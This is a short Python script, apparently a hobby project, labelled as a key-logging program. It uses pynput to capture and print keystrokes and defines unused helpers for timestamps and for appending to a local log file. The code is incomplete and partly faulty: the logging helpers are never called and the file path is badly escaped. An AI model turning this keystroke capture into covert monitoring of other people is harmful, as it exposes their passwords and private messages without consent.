"""
    Creating a key logging program.
    The goal is to log key strokes with the date and time for each sentence.
"""
from pynput import keyboard
from datetime import datetime as t
#%-----------------------------------------------------------------------------
# Listens to the key inputs from the keyboard
def on_press(key):
    try:
        print('{0}'.format(key))
    except AttributeError:
        print('special key {0} pressed'.format(key))
#%-----------------------------------------------------------------------------
# Marks down keys once released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False
#%-----------------------------------------------------------------------------
def get_time():
    # This gets the date and time in 
    # dd/mm/yyyy and HH:MM:SS
    now = t.now()
    current_dt = now.strftime("[%d/%m/%Y %H:%M:%S]: ")
    # This only gets the time HH:MM:SS
    #time_only = t.now()
    #current_t = now.strftime("[%H:%M:%S]: ")
    return current_dt
    
#%-----------------------------------------------------------------------------
def write_file(key):
    # For Linux Directory
    #with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as \\
            #logging:
    # For Windows Directory
    with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as logging:
               # This appends to a file.
        for keys in key:
            logging.write(keys)

#%-----------------------------------------------------------------------------  
# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
#%-----------------------------------------------------------------------------
# ...or, in a non-blocking fashion:
#listener = keyboard.Listener(on_press=on_press,on_release=on_release)
#
listener.start()
#%-----------------------------------------------------------------------------


